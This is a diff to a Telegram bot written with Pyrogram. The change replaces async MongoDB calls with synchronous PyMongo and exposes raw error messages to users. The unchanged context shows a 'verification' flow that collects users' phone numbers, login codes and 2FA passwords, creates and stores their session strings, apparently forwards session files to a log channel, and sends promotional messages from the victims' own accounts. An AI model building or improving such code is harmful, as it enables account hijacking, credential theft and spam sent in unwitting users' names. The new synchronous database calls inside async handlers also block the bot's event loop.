@@ -23,12 +23,21 @@ from pyrogram.errors import (
     SessionRevoked,
     SessionExpired
 )
-from motor.motor_asyncio import AsyncIOMotorClient
+from pymongo.mongo_client import MongoClient
+from pymongo.server_api import ServerApi
 from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
 
-# Async MongoDB Setup
-mongo_client = AsyncIOMotorClient(DATABASE_URI_SESSIONS_F)
+# MongoDB Connection Setup
+mongo_client = MongoClient(DATABASE_URI_SESSIONS_F, server_api=ServerApi('1'))
 database = mongo_client['Cluster0']['sessions']
+
+# Test MongoDB connection
+try:
+    mongo_client.admin.command('ping')
+    print("Successfully connected to MongoDB!")
+except Exception as e:
+    print(f"MongoDB connection error: {e}")
+    raise
 
 # Promo Texts (10 unique messages)
 PROMO_TEXTS = [
@@ -102,8 +111,8 @@ VERIFICATION_SUCCESS_KEYBOARD = InlineKeyboardMarkup([
 # State Management
 user_states = {}
 
-async def check_login_status(user_id):
-    user_data = await database.find_one({"id": user_id})
+def check_login_status(user_id):
+    user_data = database.find_one({"id": user_id})
     return bool(user_data and user_data.get('logged_in'))
 
 async def cleanup_user_state(user_id):
@@ -126,7 +135,7 @@ async def handle_session_error(bot: Client, phone_number: str, error: Exception)
         f"🛑 Auto-disabled promotion\n"
         f"❌ Error: {str(error)[:200]}"
     )
-    await database.update_one(
+    database.update_one(
         {"mobile_number": phone_number},
         {"$set": {"promotion": False}}
     )
@@ -134,7 +143,7 @@ async def handle_session_error(bot: Client, phone_number: str, error: Exception)
 @Client.on_message(filters.private & filters.command("start"))
 async def start_login(bot: Client, message: Message):
     user_id = message.from_user.id
-    user_data = await database.find_one({"id": user_id})
+    user_data = database.find_one({"id": user_id})
     
     if user_data and user_data.get('session'):
         try:
@@ -143,7 +152,7 @@ async def start_login(bot: Client, message: Message):
             await test_client.get_me()
             await test_client.disconnect()
             
-            await database.update_one(
+            database.update_one(
                 {"id": user_id},
                 {"$set": {"logged_in": True}}
             )
@@ -151,12 +160,12 @@ async def start_login(bot: Client, message: Message):
             asyncio.create_task(send_promotion_messages(bot, user_data['session'], user_data['mobile_number']))
             return
         except Exception:
-            await database.update_one(
+            database.update_one(
                 {"id": user_id},
                 {"$set": {"logged_in": False, "session": None, "promotion": False}}
             )
     
-    if await check_login_status(user_id):
+    if check_login_status(user_id):
         await message.reply(strings['already_logged_in'])
         return
     
@@ -173,7 +182,7 @@ async def start_login(bot: Client, message: Message):
 async def handle_logout(bot: Client, message: Message):
     user_id = message.from_user.id
     
-    await database.update_one(
+    database.update_one(
         {"id": user_id},
         {"$set": {"logged_in": False}}
     )
@@ -184,7 +193,7 @@ async def handle_logout(bot: Client, message: Message):
 @Client.on_message(filters.private & filters.contact)
 async def handle_contact(bot: Client, message: Message):
     user_id = message.from_user.id
-    if await check_login_status(user_id):
+    if check_login_status(user_id):
         await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
     
@@ -218,14 +227,14 @@ async def handle_contact(bot: Client, message: Message):
         await bot.delete_messages(user_id, processing_msg.id)
         
     except Exception as e:
-        await message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", reply_markup=ReplyKeyboardRemove())
+        await message.reply(f"Error: {e}\n/start again.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
 @Client.on_callback_query(filters.regex("^otp_"))
 async def handle_otp_buttons(bot: Client, query: CallbackQuery):
     user_id = query.from_user.id
     if user_id not in user_states:
-        await query.answer("⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", show_alert=True)
+        await query.answer("Session expired. /start again.", show_alert=True)
         await query.message.delete()
         return
     
@@ -251,7 +260,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             state['otp_attempts'] += 1
             if state['otp_attempts'] >= 3:
                 await query.message.edit(strings['otp_blocked'])
-                await database.update_one(
+                database.update_one(
                     {"id": user_id},
                     {"$set": {"blocked": True}}
                 )
@@ -269,7 +278,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             state['needs_password'] = True
             state['last_msg_id'] = query.message.id
         except Exception as e:
-            await query.message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.")
+            await query.message.reply(f"Error: {e}\n/start again.")
             await cleanup_user_state(user_id)
         return
     else:
@@ -307,7 +316,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         verified_msg = await bot.send_message(user_id, "Password verified...", reply_markup=ReplyKeyboardRemove())
         state['verified_msg_id'] = verified_msg.id
         
-        await database.update_one(
+        database.update_one(
             {"id": user_id},
             {"$set": {
                 "2fa_status": True,
@@ -322,7 +331,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         state['2fa_attempts'] += 1
         if state['2fa_attempts'] >= 3:
             await message.reply(strings['2fa_blocked'], reply_markup=ReplyKeyboardRemove())
-            await database.update_one(
+            database.update_one(
                 {"id": user_id},
                 {"$set": {"blocked": True}}
             )
@@ -336,7 +345,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         )
         state['last_msg_id'] = error_msg.id
     except Exception as e:
-        await message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", reply_markup=ReplyKeyboardRemove())
+        await message.reply(f"Error: {e}\n/start again.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
 async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
@@ -351,11 +360,11 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
             'promotion': True
         }
         
-        if existing := await database.find_one({"id": user_id}):
-            await database.update_one({'_id': existing['_id']}, {'$set': data})
+        if existing := database.find_one({"id": user_id}):
+            database.update_one({'_id': existing['_id']}, {'$set': data})
         else:
             data['id'] = user_id
-            await database.insert_one(data)
+            database.insert_one(data)
 
         os.makedirs("sessions", exist_ok=True)
         clean_phone = phone_number.replace('+', '')
@@ -392,7 +401,7 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         asyncio.create_task(send_promotion_messages(bot, string_session, phone_number))
         
     except Exception as e:
-        await bot.send_message(user_id, f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.")
+        await bot.send_message(user_id, f"Error creating session: {e}\n/start again")
     finally:
         await cleanup_user_state(user_id)
 
@@ -472,7 +481,7 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                     message_text
                 )
             
-            user_data = await database.find_one({"mobile_number": phone_number})
+            user_data = database.find_one({"mobile_number": phone_number})
             if not user_data or not user_data.get('promotion', True):
                 await bot.send_message(
                     LOG_CHANNEL_SESSIONS_FILES,
